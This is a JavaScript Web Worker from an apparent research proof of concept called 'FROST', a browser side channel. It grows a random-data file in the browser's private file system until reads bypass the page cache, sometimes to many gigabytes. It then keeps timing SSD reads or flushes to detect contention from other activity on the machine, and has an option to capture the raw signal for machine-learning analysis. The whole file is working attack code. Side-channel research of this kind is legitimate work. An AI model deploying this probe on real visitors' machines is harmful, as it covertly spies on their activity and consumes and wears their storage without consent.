// FROST PoC worker: owns the OPFS file, grows it until it defeats the page
// cache, then continuously times random reads to surface SSD contention.
//
// Runs in a Web Worker because FileSystemSyncAccessHandle (the fast, synchronous
// OPFS read/write path) is only available off the main thread.

const FILE_NAME = "frost-contention.bin";
const PROBE_READS = 2000;        // reads per calibration probe
const DEBOUNCE = 2;              // consecutive over-threshold probes to confirm the knee
const REPORT_EVERY = 256;        // batch this many samples before posting to UI
const SPIKE_LIMIT_US = 1000;     // paper's filter: samples > 1 ms are smoothed away
const SPIKE_WINDOW = 100;        // local-average window for the spike filter

let handle = null;               // FileSystemSyncAccessHandle
let fileSize = 0;                // bytes actually written (== logical size)
let readSize = 4096;
let readBuf = null;              // DataView/ArrayBuffer reused for every read
let running = false;             // continuous monitor active
let abortBuild = false;
let spikeFilter = true;          // smooth >1ms samples for the live chart; off for ML capture
let channel = "read";            // "read" (large-file knee) or "flush" (RAM-independent)
let probeBuf = null;             // small write buffer for the flush probe
let flushOffset = 0;             // rotating write offset for the flush probe

const FLUSH_FILE_BYTES = 64 * 1024 * 1024; // flush mode only needs a small file to write into

function log(msg)  { postMessage({ type: "log", msg }); }
function err(msg)  { postMessage({ type: "error", msg }); }

function median(arr) {
  const a = arr.slice().sort((x, y) => x - y);
  const m = a.length >> 1;
  return a.length % 2 ? a[m] : (a[m - 1] + a[m]) / 2;
}

async function getDir() {
  return await navigator.storage.getDirectory();
}

// One timed random 4 kB-aligned read. Returns latency in microseconds.
function timedRead() {
  const slots = Math.max(1, Math.floor(fileSize / readSize));
  // Math.random is fine here: we only need offsets spread across the file to
  // defeat prefetch/caching, not cryptographic randomness.
  const offset = Math.floor(Math.random() * slots) * readSize;
  const t0 = performance.now();
  handle.read(readBuf, { at: offset });
  const t1 = performance.now();
  return (t1 - t0) * 1000; // ms -> us
}

// One timed write + flush. Returns the flush latency in microseconds.
// flush() forces the write to the SSD, so this surfaces contention even when the
// file is small enough to be fully cached - no page-cache knee required, so it
// works inside Firefox's 10 GB OPFS cap and on high-RAM machines.
function timedFlush() {
  const slots = Math.max(1, Math.floor(fileSize / readSize));
  const offset = (flushOffset++ % slots) * readSize;
  handle.write(probeBuf, { at: offset });
  const t0 = performance.now();
  handle.flush();
  const t1 = performance.now();
  return (t1 - t0) * 1000; // ms -> us
}

// ---- calibration: grow + probe until reads stop being cache-served ----------
async function build(opts) {
  abortBuild = false;
  readSize = opts.readSize;
  readBuf = new Uint8Array(readSize);

  const stepBytes = opts.stepBytes;
  const maxBytes = opts.maxBytes;
  const threshUs = opts.threshUs;
  channel = opts.channel === "flush" ? "flush" : "read";

  // Release any handle left open by a previous build/monitor session, otherwise
  // createSyncAccessHandle throws ("another open Access Handle ... same file").
  if (handle) { try { handle.flush(); handle.close(); } catch (e) {} handle = null; }

  const dir = await getDir();
  const fh = await dir.getFileHandle(FILE_NAME, { create: true });
  handle = await fh.createSyncAccessHandle();
  fileSize = handle.getSize();
  log(`opened OPFS file, current size ${(fileSize / 1e9).toFixed(2)} GB`);

  // Write-flush channel: time handle.flush() instead of reads. RAM-independent,
  // so there is no page-cache knee to find and only a small file is needed.
  if (channel === "flush") {
    probeBuf = new Uint8Array(readSize);
    crypto.getRandomValues(probeBuf);
    if (fileSize < FLUSH_FILE_BYTES) {
      const CH = 16 * 1024 * 1024;
      const wb = new Uint8Array(Math.min(CH, FLUSH_FILE_BYTES));
      crypto.getRandomValues(wb.subarray(0, 65536));
      for (let o = 65536; o < wb.length; o += 65536) wb.copyWithin(o, 0, Math.min(65536, wb.length - o));
      let pos = fileSize;
      while (pos < FLUSH_FILE_BYTES) {
        const n = Math.min(wb.length, FLUSH_FILE_BYTES - pos);
        handle.write(wb.subarray(0, n), { at: pos });
        handle.flush();
        pos += n;
      }
      fileSize = handle.getSize();
    }
    postMessage({ type: "size", bytes: fileSize });
    log(`write-flush channel ready at ${(fileSize / 1e9).toFixed(2)} GB - timing flush() (RAM-independent)`);
    postMessage({ type: "built", bytes: fileSize });
    startMonitor();
    return;
  }

  // If the existing file already reads at SSD latency, it was calibrated in a
  // previous session - skip the (slow, SSD-wearing) fill and just continue.
  if (fileSize >= readSize) {
    const probe = new Array(PROBE_READS);
    for (let i = 0; i < PROBE_READS; i++) probe[i] = timedRead();
    const med = median(probe);
    log(`existing file ${(fileSize / 1e9).toFixed(1)} GB, probe median ${med.toFixed(1)} us`);
    if (med >= threshUs) {
      log(`already past the knee - continuing without growing the file`);
      postMessage({ type: "built", bytes: fileSize });
      startMonitor();
      return;
    }
  }

  // A reusable buffer of random bytes to write (avoids zero-page dedup/sparseness).
  const CHUNK = 16 * 1024 * 1024;        // 16 MB write chunks
  const YIELD_BYTES = 512 * 1024 * 1024; // yield to the event loop every 512 MB
  const writeBuf = new Uint8Array(CHUNK);
  crypto.getRandomValues(writeBuf.subarray(0, 65536)); // seed; tile the rest
  for (let o = 65536; o < CHUNK; o += 65536) {
    writeBuf.copyWithin(o, 0, Math.min(65536, CHUNK - o));
  }

  let over = 0;
  let quotaHit = false;
  while (true) {
    if (abortBuild) { log("build aborted"); break; }
    if (fileSize >= maxBytes) {
      log(`reached max size ${(maxBytes / 1e9).toFixed(0)} GB without a clear knee - ` +
          `cache may be larger than expected. Monitoring anyway.`);
      break;
    }

    // Grow by one step of real random data.
    const target = Math.min(fileSize + stepBytes, maxBytes);
    let pos = fileSize;
    let sinceYield = 0;
    while (pos < target) {
      if (abortBuild) break;
      const n = Math.min(CHUNK, target - pos);
      // vary a few bytes per chunk so the controller can't trivially dedup
      writeBuf[0] = pos & 0xff; writeBuf[1] = (pos >> 8) & 0xff;
      try {
        handle.write(writeBuf.subarray(0, n), { at: pos });
        // Flush every chunk: keep dirty pages ~CHUNK-bounded instead of letting a
        // whole GB-sized step pile up unwritten - that backlog (with no swap) is
        // what OOM-kills the browser on a from-scratch fill.
        handle.flush();
      } catch (ex) {
        if (ex && (ex.name === "QuotaExceededError" || /quota/i.test(ex.message || ""))) {
          log(`hit the OPFS quota near ${(pos / 1e9).toFixed(1)} GB ` +
              `(browser cap, e.g. Firefox ~10 GB) - stopping fill`);
          quotaHit = true;
          break;
        }
        throw ex;
      }
      pos += n;
      sinceYield += n;
      if (sinceYield >= YIELD_BYTES) {
        // Let the kernel write back / reclaim, and stay responsive to "stop".
        sinceYield = 0;
        fileSize = pos;
        postMessage({ type: "size", bytes: fileSize });
        await new Promise((r) => setTimeout(r, 0));
      }
    }
    fileSize = handle.getSize();
    postMessage({ type: "size", bytes: fileSize });
    if (quotaHit) {
      log(`monitoring at ${(fileSize / 1e9).toFixed(1)} GB - quota-limited; the read ` +
          `channel only leaks if this exceeds free RAM (else try the write-flush channel)`);
      break;
    }

    // Probe: random reads across the whole file, take the median.
    const samples = new Array(PROBE_READS);
    for (let i = 0; i < PROBE_READS; i++) samples[i] = timedRead();
    const med = median(samples);
    log(`size ${(fileSize / 1e9).toFixed(1).padStart(5)} GB -> probe median ` +
        `${med.toFixed(1)} us ${med >= threshUs ? ">" : ""}`);

    if (med >= threshUs) {
      if (++over >= DEBOUNCE) {
        log(`KNEE reached: reads now hit the SSD (median ${med.toFixed(1)} us >= ` +
            `${threshUs} us) at ${(fileSize / 1e9).toFixed(1)} GB. Stopping fill.`);
        break;
      }
    } else {
      over = 0;
    }
  }

  postMessage({ type: "built", bytes: fileSize });
  startMonitor();
}

// ---- continuous monitoring loop ---------------------------------------------
function startMonitor() {
  running = true;
  postMessage({ type: "monitoring" });
  loop();
}

function loop() {
  if (!running) return;
  const batch = new Float64Array(REPORT_EVERY);
  const probe = channel === "flush" ? timedFlush : timedRead;
  const t0 = performance.now();
  for (let i = 0; i < REPORT_EVERY; i++) batch[i] = probe();

  // Spike filter (paper sec4): replace any sample > 1 ms with the local mean.
  // Skipped during ML capture so the offline pipeline sees the raw signal.
  if (spikeFilter) {
    for (let i = 0; i < batch.length; i++) {
      if (batch[i] > SPIKE_LIMIT_US) {
        let sum = 0, cnt = 0;
        const lo = Math.max(0, i - SPIKE_WINDOW / 2);
        const hi = Math.min(batch.length, i + SPIKE_WINDOW / 2);
        for (let j = lo; j < hi; j++) if (j !== i && batch[j] <= SPIKE_LIMIT_US) { sum += batch[j]; cnt++; }
        if (cnt) batch[i] = sum / cnt;
      }
    }
  }
  const elapsedMs = performance.now() - t0;
  postMessage({ type: "samples", batch, rate: (REPORT_EVERY / elapsedMs) * 1000 },
              [batch.buffer]);

  // Yield so the worker stays responsive to stop/reset messages.
  setTimeout(loop, 0);
}

async function reset() {
  running = false;
  if (handle) { try { handle.close(); } catch (e) {} handle = null; }
  try {
    const dir = await getDir();
    await dir.removeEntry(FILE_NAME);
    log("deleted OPFS file");
  } catch (e) {
    log("nothing to delete (" + e.name + ")");
  }
  fileSize = 0;
  postMessage({ type: "reset" });
}

onmessage = async (e) => {
  const m = e.data;
  try {
    if (m.cmd === "build") await build(m);
    else if (m.cmd === "stop") {
      running = false; abortBuild = true;
      // Close the handle so OPFS durably commits the file's size - otherwise the
      // calibrated file reverts to its last cleanly-closed size on reload.
      if (handle) { try { handle.flush(); handle.close(); } catch (e) {} handle = null; }
      postMessage({ type: "stopped" });
    }
    else if (m.cmd === "reset") await reset();
    else if (m.cmd === "setFilter") { spikeFilter = !!m.on; log(`spike filter ${spikeFilter ? "on" : "off"}`); }
  } catch (ex) {
    err((ex && ex.message) || String(ex));
  }
};
